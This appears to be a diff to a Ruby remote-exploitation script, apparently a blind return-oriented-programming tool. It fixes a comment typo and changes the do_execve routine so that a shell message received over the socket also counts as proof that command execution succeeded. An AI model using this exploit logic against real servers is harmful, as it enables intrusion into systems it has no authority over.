@@ -1207,7 +1207,7 @@ def find_plt_depth()
 	$state.depth = 18
 	$state.pad   = 0
 
-	probe_depth = 50  # How far down to probe befor giving up.
+	probe_depth = 50  # How far down to probe before giving up.
 	find_plt(probe_depth)
 
 #	if not $state.plt
@@ -1912,6 +1912,8 @@ def do_execve()
 
 	stuff = "" + x
 
+	got_good_stuff = false
+
 	while true
 		begin
 			x = s.recv(4096)
@@ -1927,10 +1929,12 @@ def do_execve()
 
 		print("do_execve received length  #{x.length}, stuff=#{stuff}\n")
 
-		break if stuff.include?(str)
+		got_good_stuff = stuff.include?(str) || stuff.include?("sh: turning off NDELAY mode")
+
+		break if got_good_stuff
 	end
 
-	if not stuff.include?(str)
+	if not got_good_stuff
 		print("Write didn't happen\n")
 		s.close()
 		return
